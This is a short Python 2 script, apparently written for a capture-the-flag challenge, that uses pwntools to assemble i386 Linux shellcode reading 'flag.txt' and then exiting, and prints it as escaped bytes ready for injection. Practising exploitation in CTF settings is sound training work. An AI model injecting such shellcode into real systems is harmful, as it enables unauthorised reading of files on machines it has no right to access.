from pwn import *

context.clear(arch = 'i386')

s = pwnlib.shellcraft.i386.linux.cat('flag.txt').rstrip()
s += pwnlib.shellcraft.i386.linux.syscall('SYS_exit', 0).rstrip()

def toCode(shellcraft):
    res = ''
    s = asm(shellcraft).encode('hex')
    if len(s) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(s)):
        if i % 2 == 0: res += '\\x'
        res += s[i]
    return res

print toCode(s)
